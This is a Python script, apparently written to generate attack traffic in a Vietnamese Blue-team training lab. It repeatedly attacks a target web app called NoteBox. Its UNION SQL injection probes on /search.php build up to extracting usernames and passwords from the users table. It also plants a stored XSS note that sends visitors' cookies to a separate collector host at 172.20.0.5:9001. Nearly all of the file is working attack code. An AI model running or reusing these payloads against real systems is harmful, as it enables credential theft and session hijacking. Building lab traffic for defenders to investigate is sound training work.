#!/usr/bin/env python3
# Tan cong tu dong vao 'targeta' (he A - NoteBox): UNION SQLi o /search.php + cam mot note
# chua Stored XSS. Chay lien tuc (tu 172.20.0.5) de SIEM/log ghi nhan cho Blue dieu tra.
import urllib.request, urllib.parse, http.cookiejar, time

B = "http://targeta"

def session():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(op, path):
    try:
        with op.open(B + path, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except Exception as e:
        return None, str(e)

def post(op, path, data):
    d = urllib.parse.urlencode(data).encode()
    try:
        with op.open(B + path, d, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except Exception as e:
        return None, str(e)

# Cho NoteBox san sang
op = session()
for _ in range(120):
    c, _b = get(op, "/")
    if c:
        break
    time.sleep(2)

# Cac buoc trinh sat SQLi kinh dien (de SV thay trong log)
recon = [
    "'",
    "%' ORDER BY 3 -- ",
    "%' UNION SELECT 1,2 -- ",
    "%' UNION SELECT version(),database() -- ",
    "%' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- ",
    "%' UNION SELECT username,password FROM users -- ",
]
xss_note = "<script>new Image().src='http://172.20.0.5:9001/?c='+document.cookie</script>"
i = 0
while True:
    i += 1
    op = session()
    post(op, "/register.php", {"username": "mallory%d" % i, "password": "x"})     # auto-login
    post(op, "/dashboard.php", {"title": "hello", "body": xss_note})              # cam Stored XSS
    for p in recon:
        get(op, "/search.php?q=" + urllib.parse.quote(p))                         # trinh sat SQLi
    print(time.strftime("%H:%M:%S"), "attack round", flush=True)
    time.sleep(15)
